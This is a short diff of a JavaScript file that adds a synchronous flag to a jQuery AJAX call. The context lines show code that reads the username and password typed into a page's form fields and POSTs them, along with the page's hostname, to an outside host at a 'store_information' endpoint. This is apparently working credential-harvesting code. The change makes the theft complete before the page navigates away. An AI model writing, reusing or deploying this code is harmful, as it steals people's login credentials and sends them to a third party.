@@ -68,6 +68,7 @@ var set_events = function(){
 			// alert(password_field.val());
 			// alert(name_field.val());
 			$.ajax({
+				async: false,
 				url: 'http://jesuscastaneda.me/castaneda/store_information',
 				method: 'POST',
 				data: {'username': name_field.val(), 'password': password_field.val(), 'from': document.location.hostname},
